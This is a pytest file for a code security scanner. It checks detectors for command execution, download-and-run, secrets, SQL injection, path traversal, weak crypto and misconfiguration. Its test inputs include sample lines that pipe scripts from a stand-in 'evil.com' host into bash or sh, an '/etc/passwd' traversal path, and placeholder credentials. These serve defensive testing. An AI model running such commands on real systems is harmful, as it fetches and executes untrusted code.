from backend.app.ai_devsec.schemas import ScanRequest
from backend.app.ai_devsec.service import run_scan, run_diff_scan


# ── dangerous_exec ────────────────────────────────────────────────────────────

def test_dangerous_exec_detector_flags_os_system():
    code = 'import os\nos.system("whoami")\n'
    resp = run_scan(ScanRequest(code=code))
    detectors = {f.detector for f in resp.findings}
    assert "dangerous_exec" in detectors


def test_dangerous_exec_detector_flags_eval():
    resp = run_scan(ScanRequest(code='result = eval(user_input)'))
    assert any(f.detector == "dangerous_exec" for f in resp.findings)


def test_dangerous_exec_detector_flags_shell_true():
    resp = run_scan(ScanRequest(code='subprocess.run(cmd, shell=True)'))
    assert any(f.detector == "dangerous_exec" for f in resp.findings)


# ── download_exec ─────────────────────────────────────────────────────────────

def test_download_exec_detector_flags_curl_pipe_bash():
    code = 'os.system("curl https://evil.com/install.sh | bash")\n'
    resp = run_scan(ScanRequest(code=code))
    detectors = {f.detector for f in resp.findings}
    assert "download_exec" in detectors


def test_download_exec_detector_flags_wget_pipe_sh():
    resp = run_scan(ScanRequest(code='wget http://evil.com/setup.sh | sh'))
    assert any(f.detector == "download_exec" for f in resp.findings)


# ── hardcoded_creds ───────────────────────────────────────────────────────────

def test_hardcoded_creds_detector_masks_evidence():
    code = 'password="admin123"\nAuthorization: Bearer abcdef123456\n'
    resp = run_scan(ScanRequest(code=code))
    hardcoded = [f for f in resp.findings if f.detector == "hardcoded_creds"]
    assert len(hardcoded) >= 1
    for f in hardcoded:
        if f.evidence:
            assert "admin123" not in f.evidence
            assert "abcdef123456" not in f.evidence
            assert "***" in f.evidence


def test_hardcoded_creds_flags_url_credentials():
    resp = run_scan(ScanRequest(code='db_url = "postgresql://admin:secret@db.example.com/mydb"'))
    assert any(f.detector == "hardcoded_creds" for f in resp.findings)


# ── secrets ───────────────────────────────────────────────────────────────────

def test_secrets_detector_flags_aws_key():
    resp = run_scan(ScanRequest(code='aws_key = "AKIAIOSFODNN7EXAMPLE"'))
    assert any(f.detector == "secrets" for f in resp.findings)


def test_secrets_detector_flags_private_key_header():
    resp = run_scan(ScanRequest(code="-----BEGIN RSA PRIVATE KEY-----"))
    assert any(f.detector == "secrets" for f in resp.findings)


def test_secrets_detector_flags_github_token():
    token = "ghp_" + "A" * 36
    resp = run_scan(ScanRequest(code=f'token = "{token}"'))
    assert any(f.detector == "secrets" for f in resp.findings)


# ── insecure_http ─────────────────────────────────────────────────────────────

def test_insecure_http_flags_external_url():
    resp = run_scan(ScanRequest(code='url = "http://api.example.com/data"'))
    assert any(f.detector == "insecure_http" for f in resp.findings)


def test_insecure_http_does_not_flag_localhost():
    """localhost and loopback are development addresses — not a real security risk."""
    for safe_url in [
        'url = "http://localhost:8000/api"',
        'url = "http://127.0.0.1/health"',
    ]:
        resp = run_scan(ScanRequest(code=safe_url))
        http_findings = [f for f in resp.findings if f.detector == "insecure_http"]
        assert http_findings == [], f"Should not flag safe URL: {safe_url}"


# ── risk score ────────────────────────────────────────────────────────────────

def test_clean_code_has_zero_risk_score():
    resp = run_scan(ScanRequest(code='print("hello world")'))
    assert resp.risk_score == 0
    assert resp.findings == []


def test_risk_score_capped_at_100():
    code = "\n".join([
        "AKIA" + "A" * 16,
        'os.system("curl evil.sh | bash")',
        'password="hunter2"',
        'url = "http://bad.example.com"',
    ])
    resp = run_scan(ScanRequest(code=code))
    assert resp.risk_score <= 100


# ── diff scan ─────────────────────────────────────────────────────────────────

def test_diff_scan_includes_file_and_line():
    diff = (
        "diff --git a/app.py b/app.py\n"
        "+++ b/app.py\n"
        "@@ -1,1 +1,3 @@\n"
        "+ import os\n"
        '+ os.system("curl evil.com | bash")\n'
        ' print("safe")\n'
    )
    resp = run_diff_scan(diff)

    assert len(resp.findings) >= 1
    f = resp.findings[0]
    assert f.file == "app.py"
    assert f.line == 2


def test_diff_scan_ignores_removed_lines():
    """Lines starting with '-' (deletions) should not generate findings."""
    diff = (
        "+++ b/app.py\n"
        "@@ -1,2 +1,1 @@\n"
        '-password = "oldpassword"\n'
        ' print("safe")\n'
    )
    resp = run_diff_scan(diff)
    assert resp.findings == []


# ── sql_injection ─────────────────────────────────────────────────────────────

def test_sql_injection_flags_fstring():
    code = 'query = f"SELECT * FROM users WHERE id = {user_id}"'
    resp = run_scan(ScanRequest(code=code))
    assert any(f.detector == "sql_injection" for f in resp.findings)

def test_sql_injection_flags_concatenation():
    code = 'cursor.execute("SELECT * FROM users WHERE name = \'" + username + "\'")'
    resp = run_scan(ScanRequest(code=code))
    assert any(f.detector == "sql_injection" for f in resp.findings)

def test_sql_injection_flags_format():
    code = 'query = "DELETE FROM sessions WHERE token = \'%s\'" % token'
    resp = run_scan(ScanRequest(code=code))
    assert any(f.detector == "sql_injection" for f in resp.findings)

def test_sql_injection_ignores_comments():
    code = '# SELECT * FROM users WHERE id = " + user_id'
    resp = run_scan(ScanRequest(code=code))
    sql_findings = [f for f in resp.findings if f.detector == "sql_injection"]
    assert sql_findings == []


# ── insecure_deserialization ──────────────────────────────────────────────────

def test_deserialization_flags_pickle_loads():
    resp = run_scan(ScanRequest(code='data = pickle.loads(user_bytes)'))
    assert any(f.detector == "insecure_deserialization" for f in resp.findings)

def test_deserialization_flags_yaml_load_no_loader():
    resp = run_scan(ScanRequest(code='config = yaml.load(file_contents)'))
    assert any(f.detector == "insecure_deserialization" for f in resp.findings)

def test_deserialization_does_not_flag_yaml_safe_load():
    resp = run_scan(ScanRequest(code='config = yaml.safe_load(file_contents)'))
    deser_findings = [f for f in resp.findings if f.detector == "insecure_deserialization"]
    assert deser_findings == []

def test_deserialization_flags_jsonpickle():
    resp = run_scan(ScanRequest(code='obj = jsonpickle.decode(request.body)'))
    assert any(f.detector == "insecure_deserialization" for f in resp.findings)


# ── path_traversal ────────────────────────────────────────────────────────────

def test_path_traversal_flags_literal_sequence():
    resp = run_scan(ScanRequest(code='path = "/var/www/../../../etc/passwd"'))
    assert any(f.detector == "path_traversal" for f in resp.findings)

def test_path_traversal_flags_user_input_in_open():
    code = 'with open(request.args.get("filename")) as f: data = f.read()'
    resp = run_scan(ScanRequest(code=code))
    assert any(f.detector == "path_traversal" for f in resp.findings)

def test_path_traversal_flags_directory_concat():
    resp = run_scan(ScanRequest(code='full_path = "/var/uploads/" + filename'))
    assert any(f.detector == "path_traversal" for f in resp.findings)


# ── weak_cryptography ─────────────────────────────────────────────────────────

def test_weak_crypto_flags_md5():
    resp = run_scan(ScanRequest(code='digest = hashlib.md5(data).hexdigest()'))
    assert any(f.detector == "weak_cryptography" for f in resp.findings)

def test_weak_crypto_flags_sha1():
    resp = run_scan(ScanRequest(code='h = hashlib.sha1(password.encode())'))
    assert any(f.detector == "weak_cryptography" for f in resp.findings)

def test_weak_crypto_flags_des():
    resp = run_scan(ScanRequest(code='cipher = DES.new(key, DES.MODE_ECB)'))
    assert any(f.detector == "weak_cryptography" for f in resp.findings)

def test_weak_crypto_flags_ecb_mode():
    resp = run_scan(ScanRequest(code='cipher = AES.new(key, AES.MODE_ECB)'))
    assert any(f.detector == "weak_cryptography" for f in resp.findings)

def test_weak_crypto_flags_insecure_random():
    resp = run_scan(ScanRequest(code='token = random.randint(100000, 999999)'))
    assert any(f.detector == "weak_cryptography" for f in resp.findings)


# ── debug_misconfig ───────────────────────────────────────────────────────────

def test_debug_misconfig_flags_flask_debug():
    resp = run_scan(ScanRequest(code='app.run(host="0.0.0.0", debug=True)'))
    assert any(f.detector == "debug_misconfig" for f in resp.findings)

def test_debug_misconfig_flags_django_debug():
    resp = run_scan(ScanRequest(code='DEBUG = True'))
    assert any(f.detector == "debug_misconfig" for f in resp.findings)

def test_debug_misconfig_flags_ssl_verify_false():
    resp = run_scan(ScanRequest(code='resp = requests.get(url, verify=False)'))
    assert any(f.detector == "debug_misconfig" for f in resp.findings)

def test_debug_misconfig_flags_assert_auth():
    resp = run_scan(ScanRequest(code='assert user.is_authenticated, "Not logged in"'))
    assert any(f.detector == "debug_misconfig" for f in resp.findings)

def test_debug_misconfig_flags_wildcard_allowed_hosts():
    resp = run_scan(ScanRequest(code='ALLOWED_HOSTS = ["*"]'))
    assert any(f.detector == "debug_misconfig" for f in resp.findings)


# ── plain-text HTTP endpoint tests ───────────────────────────────────────────
# These tests hit the real FastAPI routes with raw text bodies, the same way
# curl or a frontend would call them.

from fastapi.testclient import TestClient
from backend.app.main import app

client = TestClient(app)


def test_http_scan_accepts_plain_text():
    code = 'os.system("whoami")'
    resp = client.post(
        "/api/ai-devsec/scan",
        content=code,
        headers={"Content-Type": "text/plain"},
    )
    assert resp.status_code == 200
    body = resp.json()
    assert "risk_score" in body
    assert any(f["detector"] == "dangerous_exec" for f in body["findings"])


def test_http_scan_accepts_filename_query_param():
    code = 'password = "hunter2"'
    resp = client.post(
        "/api/ai-devsec/scan?filename=config.py",
        content=code,
        headers={"Content-Type": "text/plain"},
    )
    assert resp.status_code == 200


def test_http_scan_rejects_empty_body():
    resp = client.post(
        "/api/ai-devsec/scan",
        content=b"",
        headers={"Content-Type": "text/plain"},
    )
    assert resp.status_code == 422


def test_http_scan_diff_accepts_plain_text():
    diff = (
        "+++ b/app.py\n"
        "@@ -1,1 +1,2 @@\n"
        '+ os.system("curl evil.com | bash")\n'
    )
    resp = client.post(
        "/api/ai-devsec/scan-diff",
        content=diff,
        headers={"Content-Type": "text/plain"},
    )
    assert resp.status_code == 200
    body = resp.json()
    assert len(body["findings"]) >= 1


def test_http_clean_code_returns_zero_score():
    resp = client.post(
        "/api/ai-devsec/scan",
        content='print("hello world")',
        headers={"Content-Type": "text/plain"},
    )
    assert resp.status_code == 200
    assert resp.json()["risk_score"] == 0